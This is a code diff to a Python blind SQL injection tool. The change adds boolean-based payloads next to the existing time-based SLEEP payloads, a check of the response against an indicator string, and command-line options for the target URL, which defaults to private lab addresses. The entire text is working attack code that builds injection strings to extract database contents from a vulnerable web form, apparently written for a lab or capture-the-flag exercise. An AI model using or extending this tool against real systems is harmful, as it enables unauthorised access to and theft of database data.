@@ -9,9 +9,15 @@ from argparse import ArgumentParser
 
 class Blind():
 	def __init__(self, url='http://10.102.10.42/regards.php?email=',
-				 delay=0.1):
+				 delay=0.1, method='time', indicator=None):
 		self.url = url
 		self.delay = delay
+		self.method = method
+		if method == 'time':
+			self.make_payload = self.make_time_payload
+		else:
+			self.make_payload = self.make_bool_payload
+		self.indicator = indicator
 
 	def send(self, payload, method='GET'):
 		payload = quote_plus(payload)
@@ -22,15 +28,30 @@ class Blind():
 			r = requests.post(self.url, data=payload)
 
 		end = time()
-		if end - start >= self.delay:
-			return True
-		else:
-			return False
 
-	def make_payload(self, cond):
+		return self.validate(self.method, start, end, r)
+
+	def make_time_payload(self, cond):
 		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
 				"),0) AND 'a'='a"
 		return query
+
+	def make_bool_payload(self, cond):
+		query = "' OR " + cond + " AND 'a'='a"
+		return query
+
+	def validate(self, method='time', start=None, end=None,
+				 response=None):
+		if method == 'time':
+			if end - start >= self.delay:
+				return True
+			else:
+				return False
+		else:
+			if self.indicator in response.text:
+				return True
+			else:
+				return False
 
 	def get_length(self, item):
 		condition = 'LENGTH(' + item + ')={}'
@@ -84,14 +105,24 @@ def get_args():
 	parser.add_argument('-t', '--test', help='Condition to test')
 	parser.add_argument('-l', '--length', help='Get length of element')
 	parser.add_argument('-s', '--string', help='Get the string')
-	parser.add_argument('-d', '--delay', help='Delay for time-based blind')
+	parser.add_argument('-d', '--delay', default=0.1, type=float,
+						help='Delay for time-based blind')
+	parser.add_argument('-m', '--method', default='time',
+						help='type of blind')
+	parser.add_argument('-i', '--indicator', default='correctly set',
+						help='Indicator for bool')
+	parser.add_argument('-u', '--url',  help='Target URL',
+						default='http://10.102.8.197/regards.php?email=')
 
 	return parser.parse_args()
 
 
 if __name__ == '__main__':
 	args = get_args()
-	b = Blind()
+	b = Blind(url=args.url, delay=args.delay, method=args.method)
+
+	if args.indicator:
+		b.indicator = args.indicator
 
 	# print(b.get_string('DATABASE()'))
 	if args.test:
